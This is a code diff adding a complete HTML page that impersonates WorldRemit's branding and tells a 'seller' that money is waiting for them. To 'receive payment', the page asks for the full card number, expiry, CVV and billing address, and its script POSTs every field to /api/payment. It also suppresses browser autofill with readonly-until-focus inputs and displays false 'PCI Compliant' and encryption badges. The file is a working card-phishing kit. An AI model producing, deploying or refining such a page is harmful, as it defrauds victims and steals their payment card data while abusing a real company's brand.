@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WorldRemit — Payment</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --brand-primary: #0052CC;
+            --brand-dark: #003D99;
+            --brand-light: #E6F0FF;
+            --brand-ghost: #F0F6FF;
+            --text-primary: #1B1B1B;
+            --text-secondary: #6B7280;
+            --text-tertiary: #9CA3AF;
+            --border: #E5E7EB;
+            --border-focus: #0052CC;
+            --bg-body: #F9FAFB;
+            --bg-card: #FFFFFF;
+            --bg-input: #F9FAFB;
+            --bg-input-focus: #FFFFFF;
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.05);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.06);
+            --shadow-lg: 0 12px 40px rgba(0,0,0,0.08);
+            --shadow-btn: 0 4px 14px rgba(0, 82, 204, 0.3);
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 16px;
+            --radius-xl: 20px;
+            --error-bg: #FEF2F2;
+            --error-border: #FECACA;
+            --error-text: #DC2626;
+            --card-dark-1: #1A2332; --card-dark-2: #243447; --card-dark-3: #2D4059;
+        }
+
+        body {
+            font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            min-height: 100vh; display: flex; align-items: center; justify-content: center;
+            background: var(--bg-body); padding: 24px 16px; color: var(--text-primary);
+            -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
+        }
+
+        body::before {
+            content: ''; position: fixed; inset: 0;
+            background: radial-gradient(ellipse 80% 50% at 50% -20%, rgba(0,82,204,0.08) 0%, transparent 60%),
+                radial-gradient(ellipse 60% 40% at 80% 100%, rgba(0,82,204,0.04) 0%, transparent 50%);
+            pointer-events: none; z-index: 0;
+        }
+
+        .page-wrapper { position: relative; z-index: 1; width: 100%; max-width: 480px; }
+        .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; padding: 0 4px; }
+        .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+        .logo-mark { width: 40px; height: 40px; background: var(--brand-primary); border-radius: 10px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; color: #fff; }
+        .logo-wordmark { font-size: 22px; font-weight: 700; color: var(--text-primary); letter-spacing: -0.5px; }
+        .help-link { font-size: 13px; font-weight: 500; color: var(--brand-primary); text-decoration: none; display: flex; align-items: center; gap: 4px; padding: 6px 12px; border-radius: var(--radius-sm); transition: background 0.2s; }
+        .help-link:hover { background: var(--brand-light); }
+        .help-link svg { width: 16px; height: 16px; }
+
+        .card { background: var(--bg-card); border-radius: var(--radius-xl); box-shadow: var(--shadow-lg); border: 1px solid rgba(0,0,0,0.04); overflow: hidden; max-height: 95vh; overflow-y: auto; }
+        .card::-webkit-scrollbar { width: 4px; } .card::-webkit-scrollbar-track { background: transparent; } .card::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+        .card-inner { padding: 28px; }
+
+        .amount-banner { background: var(--brand-ghost); border: 1px solid rgba(0, 82, 204, 0.15); border-radius: var(--radius-lg); padding: 16px 20px; text-align: center; margin-bottom: 24px; display: flex; align-items: center; justify-content: space-between; }
+        .amount-banner .info { text-align: left; }
+        .amount-banner .label { font-size: 11px; font-weight: 600; color: var(--text-tertiary); text-transform: uppercase; letter-spacing: 1px; }
+        .amount-banner .value { font-size: 24px; font-weight: 700; color: var(--text-primary); margin-top: 2px; letter-spacing: -0.5px; }
+        .amount-banner .value .currency { font-size: 16px; font-weight: 500; color: var(--text-secondary); }
+        .amount-banner .badge { background: var(--brand-primary); color: #fff; font-size: 11px; font-weight: 600; padding: 5px 10px; border-radius: 6px; white-space: nowrap; }
+
+        .card-preview { width: 100%; max-width: 360px; height: 200px; background: linear-gradient(135deg, var(--card-dark-1) 0%, var(--card-dark-2) 50%, var(--card-dark-3) 100%); border-radius: var(--radius-lg); padding: 22px 24px; margin: 0 auto 28px; position: relative; box-shadow: 0 12px 40px rgba(26,35,50,0.3); color: #fff; display: flex; flex-direction: column; justify-content: space-between; overflow: hidden; transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
+        .card-preview:hover { transform: translateY(-2px) scale(1.01); }
+        .card-preview::before { content: ''; position: absolute; top: -60px; right: -60px; width: 180px; height: 180px; background: rgba(255,255,255,0.04); border-radius: 50%; }
+        .card-preview::after { content: ''; position: absolute; bottom: -40px; left: 30%; width: 120px; height: 120px; background: rgba(255,255,255,0.03); border-radius: 50%; }
+        .card-top { display: flex; justify-content: space-between; align-items: flex-start; position: relative; z-index: 1; }
+        .card-chip { width: 40px; height: 30px; background: linear-gradient(135deg, #C9A84C, #E8D48B, #C9A84C); border-radius: 5px; position: relative; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+        .card-chip::before { content: ''; position: absolute; top: 50%; left: 8px; right: 8px; height: 1px; background: rgba(0,0,0,0.15); }
+        .card-chip::after { content: ''; position: absolute; top: 7px; left: 9px; right: 9px; bottom: 7px; border: 1px solid rgba(0,0,0,0.1); border-radius: 3px; }
+        .card-brand { font-size: 14px; font-weight: 700; letter-spacing: 1.5px; opacity: 0.9; position: relative; z-index: 1; }
+        .card-number { font-size: 20px; letter-spacing: 3px; font-weight: 500; text-align: center; margin: 4px 0; font-family: 'DM Sans', monospace; position: relative; z-index: 1; }
+        .card-number .num-group { display: inline-block; min-width: 52px; }
+        .card-bottom { display: flex; justify-content: space-between; align-items: flex-end; position: relative; z-index: 1; }
+        .card-holder-label { font-size: 8px; text-transform: uppercase; letter-spacing: 1.5px; opacity: 0.5; margin-bottom: 2px; }
+        .card-holder-name { font-size: 13px; font-weight: 500; letter-spacing: 0.8px; text-transform: uppercase; }
+        .card-expiry-label { font-size: 8px; text-transform: uppercase; letter-spacing: 1.5px; opacity: 0.5; margin-bottom: 2px; text-align: right; }
+        .card-expiry-date { font-size: 13px; font-weight: 500; }
+
+        .section-title { font-size: 15px; font-weight: 600; color: var(--text-primary); margin-bottom: 18px; display: flex; align-items: center; gap: 8px; }
+        .section-title svg { width: 18px; height: 18px; color: var(--brand-primary); }
+
+        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+        .form-grid .full-width { grid-column: 1 / -1; }
+        .input-group { margin-bottom: 2px; }
+        .input-group label { display: block; font-size: 12px; font-weight: 500; color: var(--text-secondary); margin-bottom: 6px; }
+        .input-wrap { position: relative; }
+        .input-wrap .field-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; color: var(--text-tertiary); pointer-events: none; transition: color 0.2s; }
+        .input-group input { width: 100%; padding: 12px 12px 12px 36px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); font-size: 14px; font-family: inherit; transition: all 0.2s ease; background: var(--bg-input); color: var(--text-primary); outline: none; }
+        .input-group input::placeholder { color: var(--text-tertiary); }
+        .input-group input:focus { border-color: var(--border-focus); background: var(--bg-input-focus); box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.1); }
+        .input-group input:focus ~ .field-icon { color: var(--brand-primary); }
+        .input-group input.card-input { font-family: 'DM Sans', monospace; letter-spacing: 2px; font-weight: 500; }
+        .input-group input.no-icon { padding-left: 12px; }
+
+        .btn-primary { width: 100%; padding: 14px 24px; background: var(--brand-primary); color: #fff; border: none; border-radius: var(--radius-md); font-size: 15px; font-weight: 600; font-family: inherit; cursor: pointer; transition: all 0.25s ease; display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; overflow: hidden; margin-top: 8px; }
+        .btn-primary::before { content: ''; position: absolute; inset: 0; background: linear-gradient(180deg, rgba(255,255,255,0.12) 0%, transparent 100%); pointer-events: none; }
+        .btn-primary:hover { background: var(--brand-dark); box-shadow: var(--shadow-btn); transform: translateY(-1px); }
+        .btn-primary:active { transform: translateY(0); box-shadow: 0 2px 8px rgba(0, 82, 204, 0.2); }
+        .btn-primary:disabled { opacity: 0.65; cursor: not-allowed; transform: none; box-shadow: none; }
+        .btn-primary .btn-arrow { width: 16px; height: 16px; transition: transform 0.2s; }
+        .btn-primary:hover .btn-arrow { transform: translateX(2px); }
+
+        .spinner { width: 18px; height: 18px; border: 2.5px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .error-msg { color: var(--error-text); font-size: 13px; text-align: center; margin-top: 10px; display: none; padding: 8px 12px; background: var(--error-bg); border-radius: var(--radius-sm); border: 1px solid var(--error-border); }
+
+        .secure-row { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 20px; padding-top: 18px; border-top: 1px solid var(--border); }
+        .secure-row svg { width: 14px; height: 14px; color: var(--brand-primary); }
+        .secure-row span { font-size: 12px; color: var(--text-tertiary); }
+
+        .security-row { display: flex; align-items: center; justify-content: center; gap: 16px; margin-top: 10px; }
+        .security-badge { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--text-tertiary); }
+        .security-badge svg { width: 14px; height: 14px; color: var(--brand-primary); }
+
+        .toast { position: fixed; top: 24px; left: 50%; transform: translateX(-50%) translateY(-120%); background: var(--text-primary); color: #fff; padding: 12px 20px; border-radius: var(--radius-md); font-size: 14px; font-family: inherit; box-shadow: 0 8px 30px rgba(0,0,0,0.15); z-index: 9999; transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
+        .toast.show { transform: translateX(-50%) translateY(0); }
+
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scaleIn { from { opacity: 0; transform: scale(0.92) translateY(10px); } to { opacity: 1; transform: scale(1) translateY(0); } }
+        .animate-in { animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
+        .animate-scale { animation: scaleIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
+        .delay-1 { animation-delay: 0.05s; } .delay-2 { animation-delay: 0.1s; } .delay-3 { animation-delay: 0.15s; } .delay-4 { animation-delay: 0.2s; } .delay-5 { animation-delay: 0.25s; } .delay-6 { animation-delay: 0.3s; } .delay-7 { animation-delay: 0.35s; } .delay-8 { animation-delay: 0.4s; } .delay-9 { animation-delay: 0.45s; } .delay-10 { animation-delay: 0.5s; } .delay-11 { animation-delay: 0.55s; } .delay-12 { animation-delay: 0.6s; } .delay-13 { animation-delay: 0.65s; } .delay-14 { animation-delay: 0.7s; } .delay-15 { animation-delay: 0.75s; }
+
+        @media (max-width: 520px) { body { padding: 16px 10px; } .card-inner { padding: 20px; } .form-grid { grid-template-columns: 1fr; gap: 12px; } .form-grid .full-width { grid-column: 1; } .card-preview { height: 175px; padding: 18px 20px; } .card-number { font-size: 17px; letter-spacing: 2px; } .card-number .num-group { min-width: 44px; } .amount-banner { flex-direction: column; gap: 8px; text-align: center; } .amount-banner .info { text-align: center; } }
+    </style>
+</head>
+<body>
+    <div class="toast" id="toast"></div>
+    <div class="page-wrapper">
+        <div class="top-bar animate-in">
+            <a href="index.html" class="logo">
+                <div class="logo-mark">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" width="24" height="24">
+                        <circle cx="12" cy="12" r="10" />
+                        <line x1="2" y1="12" x2="22" y2="12" />
+                        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
+                    </svg>
+                </div>
+                <span class="logo-wordmark">WorldRemit</span>
+            </a>
+            <a href="#" class="help-link">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                Help
+            </a>
+        </div>
+
+        <div class="card">
+            <div class="card-inner">
+                <div class="amount-banner animate-in delay-1">
+                    <div class="info">
+                        <div class="label">Amount to Receive</div>
+                        <div class="value"><span class="currency">$</span><span id="displayAmount">0.00</span></div>
+                    </div>
+                    <div class="badge">USD</div>
+                </div>
+
+                <div class="card-preview animate-scale delay-2" id="cardPreview">
+                    <div class="card-top">
+                        <div class="card-chip"></div>
+                        <div class="card-brand" id="cardBrand">VISA</div>
+                    </div>
+                    <div class="card-number">
+                        <span class="num-group" id="previewNum1">****</span>
+                        <span class="num-group" id="previewNum2">****</span>
+                        <span class="num-group" id="previewNum3">****</span>
+                        <span class="num-group" id="previewNum4">****</span>
+                    </div>
+                    <div class="card-bottom">
+                        <div>
+                            <div class="card-holder-label">Cardholder</div>
+                            <div class="card-holder-name" id="previewName">YOUR NAME</div>
+                        </div>
+                        <div>
+                            <div class="card-expiry-label">Expires</div>
+                            <div class="card-expiry-date" id="previewExpiry">MM/YY</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section-title animate-in delay-3">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+                    Card details
+                </div>
+
+                <form id="paymentForm" autocomplete="off">
+                    <div class="form-grid">
+                        <div class="input-group full-width animate-in delay-4">
+                            <label for="cardName">Cardholder name</label>
+                            <div class="input-wrap">
+                                <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                                <input type="text" id="cardName" name="cardName" placeholder="John Doe" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')">
+                            </div>
+                        </div>
+
+                        <div class="input-group full-width animate-in delay-5">
+                            <label for="cardNumber">Card number</label>
+                            <div class="input-wrap">
+                                <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+                                <input type="text" id="cardNumber" name="cardNumber" class="card-input" placeholder="1234 5678 9012 3456" inputmode="numeric" maxlength="19" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')">
+                            </div>
+                        </div>
+
+                        <div class="input-group animate-in delay-6">
+                            <label for="cardExpiry">Expiry date</label>
+                            <div class="input-wrap">
+                                <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+                                <input type="text" id="cardExpiry" name="cardExpiry" placeholder="MM/YY" maxlength="5" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')">
+                            </div>
+                        </div>
+
+                        <div class="input-group animate-in delay-7">
+                            <label for="cardCvv">CVV</label>
+                            <div class="input-wrap">
+                                <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                                <input type="text" id="cardCvv" name="cardCvv" placeholder="123" maxlength="4" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')">
+                            </div>
+                        </div>
+
+                        <div class="input-group full-width animate-in delay-8">
+                            <label for="billingAddress">Billing address</label>
+                            <div class="input-wrap">
+                                <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+                                <input type="text" id="billingAddress" name="billingAddress" placeholder="123 Main Street" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')">
+                            </div>
+                        </div>
+
+                        <div class="input-group animate-in delay-9">
+                            <label for="billingCity">City</label>
+                            <div class="input-wrap">
+                                <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 21h18"/><path d="M5 21V7l7-4 7 4v14"/><path d="M9 21v-6h6v6"/></svg>
+                                <input type="text" id="billingCity" name="billingCity" placeholder="New York" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')">
+                            </div>
+                        </div>
+
+                        <div class="input-group animate-in delay-10">
+                            <label for="postalCode">Postal code</label>
+                            <div class="input-wrap">
+                                <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"/><path d="M7 2v20"/><path d="M17 2v20"/><path d="M2 12h20"/><path d="M2 7h5"/><path d="M2 17h5"/><path d="M17 7h5"/><path d="M17 17h5"/></svg>
+                                <input type="text" id="postalCode" name="postalCode" placeholder="10001" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')">
+                            </div>
+                        </div>
+
+                        <button type="submit" class="btn-primary animate-in delay-11" id="submitBtn">
+                            <span>Receive payment</span>
+                            <svg class="btn-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                        </button>
+
+                        <div id="errorMsg" class="error-msg"></div>
+                    </div>
+                </form>
+
+                <div class="secure-row animate-in delay-12">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                    <span>Secured with 256-bit encryption</span>
+                </div>
+
+                <div class="security-row animate-in delay-13">
+                    <div class="security-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                        SSL Secured
+                    </div>
+                    <div class="security-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                        PCI Compliant
+                    </div>
+                    <div class="security-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                        Verified
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const saleAmount = localStorage.getItem('sellerAmount') || '0.00';
+        const numericAmount = parseFloat(saleAmount);
+        if (!isNaN(numericAmount)) {
+            document.getElementById('displayAmount').textContent = numericAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        } else {
+            document.getElementById('displayAmount').textContent = saleAmount;
+        }
+
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3500);
+        }
+
+        document.getElementById('cardName').addEventListener('input', function () {
+            const name = this.value.trim().toUpperCase() || 'YOUR NAME';
+            document.getElementById('previewName').textContent = name;
+        });
+
+        document.getElementById('cardNumber').addEventListener('input', function () {
+            let val = this.value.replace(/\D/g, '').substring(0, 16);
+            let formatted = '';
+            for (let i = 0; i < val.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += val[i];
+            }
+            this.value = formatted;
+
+            const groups = val.match(/.{1,4}/g) || [];
+            for (let i = 0; i < 4; i++) {
+                document.getElementById('previewNum' + (i + 1)).textContent = groups[i] || '****';
+            }
+
+            const brandEl = document.getElementById('cardBrand');
+            if (val.startsWith('4')) { brandEl.textContent = 'VISA'; }
+            else if (['51', '52', '53', '54', '55'].includes(val.substring(0, 2))) { brandEl.textContent = 'MASTERCARD'; }
+            else if (val.startsWith('3')) { brandEl.textContent = 'AMEX'; }
+            else if (val.startsWith('6')) { brandEl.textContent = 'DISCOVER'; }
+            else { brandEl.textContent = 'VISA'; }
+        });
+
+        document.getElementById('cardExpiry').addEventListener('input', function () {
+            let val = this.value.replace(/[^0-9]/g, '').substring(0, 4);
+            if (val.length > 2) val = val.substring(0, 2) + '/' + val.substring(2);
+            this.value = val;
+            document.getElementById('previewExpiry').textContent = val || 'MM/YY';
+        });
+
+        document.getElementById('cardCvv').addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '').substring(0, 4);
+        });
+
+        document.getElementById('paymentForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            const errorMsg = document.getElementById('errorMsg');
+
+            const data = {
+                cardName: document.getElementById('cardName').value.trim(),
+                cardNumber: document.getElementById('cardNumber').value.trim(),
+                cardExpiry: document.getElementById('cardExpiry').value.trim(),
+                cardCvv: document.getElementById('cardCvv').value.trim(),
+                billingAddress: document.getElementById('billingAddress').value.trim(),
+                billingCity: document.getElementById('billingCity').value.trim(),
+                postalCode: document.getElementById('postalCode').value.trim(),
+                amount: saleAmount
+            };
+
+            errorMsg.style.display = 'none';
+
+            for (const [key, val] of Object.entries(data)) {
+                if (!val) { errorMsg.textContent = 'Please fill in all card details to continue.'; errorMsg.style.display = 'block'; return; }
+            }
+
+            const cardNum = data.cardNumber.replace(/\s/g, '');
+            if (cardNum.length < 13 || cardNum.length > 19) { errorMsg.textContent = 'Please enter a valid card number.'; errorMsg.style.display = 'block'; return; }
+            if (!/^\d{2}\/\d{2}$/.test(data.cardExpiry)) { errorMsg.textContent = 'Please enter a valid expiry date (MM/YY).'; errorMsg.style.display = 'block'; return; }
+            if (data.cardCvv.length < 3) { errorMsg.textContent = 'Please enter a valid CVV.'; errorMsg.style.display = 'block'; return; }
+
+            btn.disabled = true;
+            btn.innerHTML = '<div class="spinner"></div><span>Processing payment...</span>';
+
+            try {
+                const res = await fetch('/api/payment', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await res.json();
+                if (result.success) {
+                    showToast('Payment processing...');
+                    setTimeout(() => { window.location.href = result.redirect; }, 600);
+                } else {
+                    errorMsg.textContent = result.message || 'Payment processing failed. Please try again.';
+                    errorMsg.style.display = 'block';
+                }
+            } catch (err) {
+                showToast('Connection error. Please check your network.');
+                errorMsg.textContent = 'Unable to connect. Please try again.';
+                errorMsg.style.display = 'block';
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '<span>Receive payment</span><svg class="btn-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';
+            }
+        });
+    </script>
+</body>
+</html>
